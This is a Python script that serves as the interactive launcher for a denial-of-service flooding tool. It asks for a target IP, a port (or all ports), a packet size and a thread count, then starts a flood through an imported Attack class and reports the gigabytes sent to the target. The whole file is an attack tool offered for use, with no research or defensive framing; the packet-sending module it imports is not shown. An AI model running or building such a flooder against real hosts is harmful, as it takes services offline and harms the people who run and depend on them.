from time import sleep
from ddos import Attack
from getpass import getpass as hinput
from colors import error, stage, blue, red, white, purple
from banner import banner_mafalda

def main():
    banner_mafalda()
    ip = input(stage(f"Enter the IP to DDOS {purple}->{red} ", "?"))

    try:
        if ip.count(".") != 3:
            int("error")
        int(ip.replace(".", ""))
    except:
        error("Error! Please enter a correct IP address.")

    port = input(
        stage(
            f"Enter port {purple}[{white}press {red}enter{white} to attack all ports{purple}] {purple}->{red} ",
            "?",
        )
    )
    port = None if port == "" else int(port)
    force = input(
        stage(
            f"Bytes per packet {purple}[{white}press {red}enter{white} for 1250{purple}] {purple}->{red} ",
            "?",
        )
    )
    force = 1250 if force == "" else int(force)
    threads = input(
        stage(
            f"Threads {purple}[{white}press {red}enter{white} for 100{purple}] {purple}->{red} ",
            "?",
        )
    )
    threads = 100 if threads == "" else int(threads)

    if force > 65000 and threads > 5000:
        print(
            f"{red}Warning! {white}This attack may not work in those conditions, consider using less than 65000 force and less than 5000 threads."
        )

    cport = "" if port is None else f"{purple}:{red}{port}"
    print(stage(f"Starting attack on {red}{ip}{cport}{white}."), end="\r")
    down = Attack(ip, port, force, threads)

    try:
        down.flood()
    except:
        down.stop()
        error("A fatal error has occured and the attack was stopped.", "")

    try:
        while True:
            sleep(1000000)
    except KeyboardInterrupt:
        down.stop()
        print(
            stage(
                f"Attack stopped. {red}{ip}{cport}{white} was overloaded with {blue}{round(down.total, 1)} {white}Gb.",
                ".",
            )
        )
    print("\n")
    sleep(1)
    hinput(stage(f"Press {red}enter{white} to {blue}exit{white}.", "."))


if __name__ == "__main__":
    main()
